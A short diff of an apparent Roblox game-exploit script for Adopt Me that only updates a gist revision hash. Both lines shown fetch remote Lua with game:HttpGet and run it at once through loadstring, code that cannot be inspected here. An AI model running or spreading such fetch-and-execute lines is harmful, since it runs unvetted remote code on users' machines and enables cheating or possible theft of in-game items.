@@ -5,4 +5,4 @@ getgenv().gui = false
 loadstring(game:HttpGet("https://raw.githubusercontent.com/zachemzhestokiy/x/main/adopt.lua", true))()
 
 _G.scriptName = "Test"
-loadstring(game:HttpGet("https://gist.githubusercontent.com/AdoptMeScript-VIP/d4f0c902b160399fd380774e2593b385/raw/d224dfd5476ad3601264db1f1bfdd7ecb0a7fb68/Test"))()
+loadstring(game:HttpGet("https://gist.githubusercontent.com/AdoptMeScript-VIP/d4f0c902b160399fd380774e2593b385/raw/94e651597d2f01433d76015118a4b9639aa95eea/Test"))()
